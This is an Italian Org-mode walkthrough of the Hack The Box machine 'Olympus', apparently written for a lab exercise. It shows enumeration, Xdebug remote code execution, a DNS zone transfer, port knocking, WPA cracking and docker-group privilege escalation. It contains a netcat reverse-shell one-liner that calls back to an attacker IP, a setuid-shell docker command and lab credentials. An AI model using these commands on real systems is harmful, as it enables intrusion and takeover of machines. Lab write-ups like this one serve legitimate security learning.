@@ -1,0 +1,215 @@
+#+TITLE: HTB - Olympus
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** leo@kali:~/repos/olympus$ nmap -p- olympus
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 09:33 CEST
+Nmap scan report for olympus (10.129.73.72)
+Host is up (0.050s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE
+22/tcp   filtered ssh
+53/tcp   open     domain
+80/tcp   open     http
+2222/tcp open     EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
+
+  #+end_example
+*** leo@kali:~/repos/olympus$ nmap -sC -sV olympus
+  #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 09:33 CEST
+Nmap scan report for olympus (10.129.73.72)
+Host is up (0.050s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE VERSION
+22/tcp   filtered ssh
+53/tcp   open     domain  (unknown banner: Bind)
+| dns-nsid: 
+|_  bind.version: Bind
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|     bind
+|_    Bind
+80/tcp   open     http    Apache httpd
+|_http-server-header: Apache
+|_http-title: Crete island - Olympus HTB
+2222/tcp open     ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-City of olympia
+| ssh-hostkey: 
+|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
+|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
+|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
+2 services unrecognized despite returning data. If you know the service/version, please submit the following finger
+prints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port53-TCP:V=7.92%I=7%D=6/14%Time=62A839EE%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
+SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\
+SF:0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port2222-TCP:V=7.92%I=7%D=6/14%Time=62A839E9%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\r\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.13 seconds
+
+  #+end_example
+** XDebug (RCE)
+   Il server in ascolto nella porta 80 ci ritorna un header
+
+   #+begin_example
+   Xdebug: 2.5.5
+   #+end_example
+
+   Andando a vedere qualche articolo:
+
+   - https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/unix/http/xdebug_unauth_exec
+   - https://www.exploit-db.com/exploits/44568
+   - https://paper.seebug.org/397/
+   - https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/
+
+   L'idea è quella di sfruttare XDEBUG per ottenere una RCE nel
+   seguente modo:
+
+   1. Prima lancio il python script preso dal terzo articolo
+
+      #+begin_src sh
+python2 xdebug_rce.py       
+      #+end_src
+
+   2. Successivamente invio una richiesta al server settando il
+      parametro ~XDEBUG_SESSION_START~
+      
+      #+begin_src sh
+curl http://olympus?XDEBUG_SESSION_START=hello      
+      #+end_src
+
+   3. Mi metto in ascolto sulla porta ~4321~
+      
+      #+begin_src sh
+nc -lvnp 4321      
+      #+end_src
+
+   4. Infine posso eseguire dei comandi utilizzando la shell spawnata
+      dallo script ~xdebug_rce~
+
+      #+begin_src sh
+      >> system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.16 4321 >/tmp/f")
+      #+end_src
+
+** dig
+*** leo@kali:~/repos/olympus$ dig @10.129.73.72 ctfolympus.htb axfr
+    #+begin_example
+; <<>> DiG 9.17.21-1-Debian <<>> @10.129.73.72 ctfolympus.htb axfr
+; (1 server found)
+;; global options: +cmd
+ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
+ctfolympus.htb.         86400   IN      A       192.168.0.120
+ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
+ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
+ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
+crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
+hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
+mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
+ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
+ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
+rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
+RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
+www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
+ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
+;; Query time: 52 msec
+;; SERVER: 10.129.73.72#53(10.129.73.72) (TCP)
+;; WHEN: Tue Jun 14 10:11:23 CEST 2022
+;; XFR size: 15 records (messages 1, bytes 475)
+    
+    #+end_example
+
+** knock
+   Fare port knocking con ~knock~
+
+   #+begin_src sh 
+sudo apt-get install knockd   
+   #+end_src
+
+   #+begin_src sh
+knock olympus 3456 8234 62431   
+   #+end_src
+
+* PrivEsc
+** Creds
+   #+begin_example
+  icarus:Too_cl0se_to_th3_Sun
+  prometheus:St34l_th3_F1re!
+   #+end_example
+
+** docker #1 (xdebug)
+*** /home/zeus/airgeddon/captured/papyrus.txt
+    #+begin_example
+Captured while flying. I'll banish him to Olympia - Zeus    
+    #+end_example
+*** captured wifi traffic    
+    Nella cartella ~airgeddon~ era presente un file ~captured.cap~. 
+
+    #+begin_src sh
+aircrack-ng -a 2 -w ~/repos/wordlists/rockyou.txt -l file captured.cap     
+    #+end_src
+
+    Alla fine l'idea era quella di utilizzare l'SSID dell'access
+    point, ~Too_cl0se_to_th3_Sun~, per connetterci come ~icarus~ alla
+    porta ssh 2222.
+
+** docker #2 (icarus)
+   
+*** /home/icarus/help_of_the_gods.txt 
+    #+begin_example
+    Athena goddess will guide you through the dark...
+
+    Way to Rhodes...
+    ctfolympus.htb
+    #+end_example
+
+** host machine (olympus)
+   Per diventare root mi devo accorgere che tra i gruppi in cui è
+   inserito l'utente ~prometheus~ c'è anche il gruppo ~docker~.
+
+   Posso quindi creare una shell ~sh~ con il ~setUID~ bit on di ~root~
+   tramite ~docker~ nel seguente modo
+
+   #+begin_src sh
+docker run -v $PWD:/tmp crete /bin/sh -c "cp /bin/sh /tmp && chown root.root /tmp/sh && chmod a+s /tmp/sh"      
+   #+end_src
+
+   Una volta eseguito il comando posso ottenere una shell da root come segue
+   
+   #+begin_example
+   $PWD/sh
+   #+end_example
+
+   Per spostare da ~euid=0~ a ~uid=0~ posso utilizzare il seguente python
+   payload
+
+   #+begin_example
+# id
+uid=1000(prometheus) gid=1000(prometheus) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker),1000(prometheus)   
+   #+end_example
+   
+   #+begin_src sh
+python -c 'import pty; import os; os.setuid(0); pty.spawn("/bin/bash")'     
+   #+end_src
+
+   #+begin_example
+bash-4.4# id
+uid=0(root) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)   
+   #+end_example
+
+* Flags
